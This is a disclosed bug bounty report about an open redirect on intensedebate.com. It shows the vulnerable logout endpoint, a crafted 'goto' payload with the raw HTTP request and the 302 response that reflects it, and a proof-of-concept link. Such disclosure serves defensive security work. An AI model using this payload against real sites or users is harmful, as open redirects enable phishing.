# [intensedebate.com] Open Redirect

## Report Details
- **Report ID**: 1050193
- **URL**: https://hackerone.com/reports/1050193
- **State**: Closed
- **Severity**: none
- **Submitted**: 2020-12-03T21:57:49.391Z
- **Disclosed**: 2021-02-10T18:51:32.817Z

## Reporter
- **Username**: fuzzme
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
Hello

## Summary:

I have found a Open Redirect on `https://intensedebate.com//fb-connect/logoutRedir.php?goto=`, the parameters `$_GET['goto']` is reflected to the HTTP-Header Response `Location`

HTTP Request

```
GET /fb-connect/logoutRedir.php?goto=\http://\ HTTP/1.1
Host: intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: y=y;
Upgrade-Insecure-Requests: 1
```


HTTP Response

```
HTTP/1.1 302 Found
Server: nginx
Date: Thu, 03 Dec 2020 21:52:42 GMT
Content-Type: text/html; charset=utf-8
Connection: close
P3P: CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"
Set-Cookie: fbName=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Set-Cookie: fbUrl=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Set-Cookie: fbPic=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Location: \http://\
Content-Length: 0
```
## POC


1) Open this following link `http://intensedebate.com//fb-connect/logoutRedir.php?goto=https://www.google.fr` and you will be redirected to google.fr


Thank you, good bye

Fuzzme.

## Impact

An attacker can use this vulnerability to redirect users to other malicious websites, which can be used for phishing and similar attacks

## Attachments
No attachments
